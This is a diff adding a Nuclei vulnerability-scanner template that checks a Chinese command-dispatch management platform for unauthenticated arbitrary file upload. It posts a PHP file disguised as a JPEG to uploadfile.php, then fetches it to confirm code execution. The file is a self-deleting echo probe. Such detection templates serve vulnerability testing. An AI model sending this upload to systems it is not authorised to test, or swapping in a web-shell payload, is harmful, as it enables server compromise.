@@ -1,0 +1,43 @@
+id: command-dispatch-event-uploadfile-fileupload
+
+info:
+  name: 指挥调度管理平台 uploadfile.php 任意文件上传
+  author: SleepingBag945
+  severity: critical
+  tags: 指挥调度管理平台
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+
+http:
+  - raw:
+      - |
+        POST /api/client/event/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="uploadfile"; filename="{{filename}}.php"
+        Content-Type: image/jpeg
+
+        <?php echo 111*111; unlink(__FILE__); ?>
+        --{{boundary}}--
+        
+      - |
+        GET /{{url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: url
+        internal: true
+        json:
+          - .url
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_2, "12321")
